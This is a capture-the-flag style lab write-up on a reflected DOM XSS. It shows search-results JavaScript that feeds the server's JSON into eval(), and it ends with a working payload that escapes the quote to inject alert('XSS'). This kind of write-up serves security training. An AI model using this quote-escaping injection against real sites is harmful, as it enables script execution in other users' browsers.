# Lab: Reflected DOM XSS
## Description

First, running the search and looking in Burp Proxy logs, I noticed that two requests were made:

A request to `/?search=asdasd` would trigger a second HTTP request to `/search-results?search=asdasd` which would return the search results to the client. The response would look something like this:

```json
{ "results": [], "searchTerm": "asdasd" }
```
Notice the search query (`searchTerm`) is also returned in the response.

Next, the client-side code contained some JavaScript located in `/resources/js/searchResults.js` which would parse the search results:

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

	[..SNIPPET..]
```

The JSON response from the search would then be sent to a vulnerable sink.
```js
eval('var searchResultsObj = ' + this.responseText);
```

All he have to do now, would be to break out of the json object function and inject our own JS into the `eval()` function. We can do that by unescaping the double-quote sign like this `asdasd\"};//` and uncommenting everything after using `//`. This would convert the json response to:

```json
{ "results": [], "searchTerm": "asdasd\\"};//}
```

Now, we just need to add `alert()` to the payload our alert...


## Solution

`asdasd\"};alert('XSS');//`